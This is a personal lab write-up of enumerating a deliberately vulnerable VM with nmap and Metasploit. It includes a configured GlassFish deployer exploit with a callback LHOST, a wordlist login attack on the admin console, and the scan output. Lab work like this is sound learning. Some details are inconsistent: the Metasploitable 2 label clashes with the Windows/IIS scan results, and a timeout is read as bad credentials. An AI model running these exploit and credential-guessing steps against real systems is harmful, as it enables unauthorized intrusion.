# My Little Cyber Projects #11

## Metasploitable 2 – Enumeration and GlassFish Investigation

### Goal

This lab documents my work with an intentionally vulnerable virtual machine, Metasploitable 2, from Kali Linux. My objective was to practice the typical penetration testing workflow:

1. Reconnaissance
2. Enumeration
3. Exploitation
4. Analysis of the results

---

# Lab Setup

| Machine                    | IP Address     | Purpose           |
| -------------------------- | -------------- | ----------------- |
| Kali Linux                 | 192.168.56.101 | Attacking machine |
| Metasploitable / target VM | 192.168.56.102 | Vulnerable target |

I used a Host-Only Adapter in VirtualBox so that both machines could communicate only inside the virtual lab.

---

# 1. Reconnaissance

First, I identified the IP address of the target.

On the target machine I checked the interface configuration:

```bash
ifconfig
```

Then from Kali I verified connectivity:

```bash
ping 192.168.56.102
```

---

# 2. Initial Port Scan

To quickly identify the most common open ports, I ran:

```bash
nmap -F 192.168.56.102
```

Output:

```text
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
```

This immediately showed several interesting attack surfaces:

* FTP on port 21
* IIS web server on port 80
* SMB on ports 139/445
* MySQL on port 3306
* GlassFish server on port 8080

---

# 3. Detailed Service Enumeration

I then performed a more detailed scan using version detection and default NSE scripts:

```bash
nmap -sV -sC -p 21,22,80,135,139,445,3306,3389,8009,8080 192.168.56.102
```

Important findings:

```text
21/tcp   open  ftp    Microsoft ftpd
80/tcp   open  http   Microsoft IIS 7.5
445/tcp  open  microsoft-ds Windows Server 2008 R2
8080/tcp open  http   Oracle GlassFish 4.0
```

The scan also revealed:

* HTTP TRACE enabled on port 80
* SMB signing not required
* GlassFish allowed risky methods such as PUT, DELETE and TRACE

These findings suggested that the most promising direction would be the GlassFish server running on port 8080.

---

# 4. Investigating the Web Server on Port 80

I opened the site in the browser:

```text
http://192.168.56.102
```

Then I used Metasploit for additional web enumeration.

```text
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.56.102
set RPORT 80
run
```

Result:

```text
[+] Found http://192.168.56.102:80/aspnet_client/ 403
```

This indicated that:

* the directory exists
* access is forbidden
* the web server likely hosts an ASP.NET application

Next I searched for common files:

```text
use auxiliary/scanner/http/files_dir
set RHOSTS 192.168.56.102
set RPORT 80
run
```

Result:

```text
[+] Found http://192.168.56.102:80/index.html 200
```

I then opened:

```text
http://192.168.56.102/index.html
```

and inspected both the visible page and the page source in Firefox.

---

# 5. GlassFish Enumeration on Port 8080

The web server on port 8080 returned the default GlassFish page:

```text
GlassFish Server - Server Running
```

I confirmed this with Metasploit:

```text
use auxiliary/scanner/http/title
set RHOSTS 192.168.56.102
set RPORT 8080
run
```

Output:

```text
[+] GlassFish Server - Server Running
```

Then I searched for GlassFish-related modules:

```text
search glassfish
```

Interesting modules included:

```text
auxiliary/scanner/http/glassfish_login
exploit/multi/http/glassfish_deployer
auxiliary/scanner/http/glassfish_traversal
```

---

# 6. Attempted Exploitation of the GlassFish Admin Console

The GlassFish deployer exploit requires the administration interface on port 4848.

I first confirmed that the port was open:

```bash
nmap -Pn -p 4848 192.168.56.102
```

Output:

```text
4848/tcp open appserv-http
```

Then I configured the Metasploit exploit:

```text
use exploit/multi/http/glassfish_deployer
set RHOSTS 192.168.56.102
set RPORT 4848
set USERNAME admin
set PASSWORD adminadmin
set LHOST 192.168.56.101
run
```

Result:

```text
Exploit aborted due to failure: Connection timed out
```

The failure suggested that the admin credentials were incorrect.

---

# 7. Password Testing with a Dictionary Attack

To test whether the GlassFish administration console used weak or default credentials, I switched to:

```text
use auxiliary/scanner/http/glassfish_login
```

Then I configured two wordlists:

```text
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
```

These options tell Metasploit:

* `USER_FILE` = list of usernames to try
* `PASS_FILE` = list of passwords to try

Examples from the wordlists:

```text
admin
root
guest
user
```

```text
password
admin
123456
guest
```

Metasploit automatically combines them into login attempts such as:

```text
admin : admin
admin : password
root : toor
guest : guest
```

This is a dictionary attack, not a full brute force attack. I used a predefined list of common usernames and passwords rather than generating random combinations.

Because this work was performed only inside my intentionally vulnerable lab, it was a legitimate penetration testing exercise.

---

# Bash Commands I Practiced

```bash
# verify network connectivity
ping 192.168.56.102

# quick port scan
nmap -F 192.168.56.102

# detailed scan
nmap -sV -sC -p 21,22,80,135,139,445,3306,3389,8009,8080 192.168.56.102

# check if the GlassFish admin interface is open
nmap -Pn -p 4848 192.168.56.102

# inspect the usernames wordlist
cat /usr/share/metasploit-framework/data/wordlists/unix_users.txt

# inspect the passwords wordlist
cat /usr/share/wordlists/metasploit/unix_passwords.txt

# download the content of a web page
curl http://192.168.56.102 -o response.bin
```

---

# What I Learned

* How to identify the correct IP address in a virtual lab
* The difference between quick and detailed Nmap scans
* How to interpret open ports and service versions
* How to use `RHOSTS` and `RPORT` in Metasploit
* How to enumerate a web server with Metasploit auxiliary modules
* How to investigate a GlassFish server
* The difference between a dictionary attack and brute force
* Why default credentials are dangerous in real environments

---

# Next Steps

In future labs I want to continue with:

* SMB enumeration on ports 139/445
* Testing anonymous FTP access
* Exploring the GlassFish traversal module
* Learning privilege escalation after initial access
* Using Burp Suite to inspect requests sent to the web application
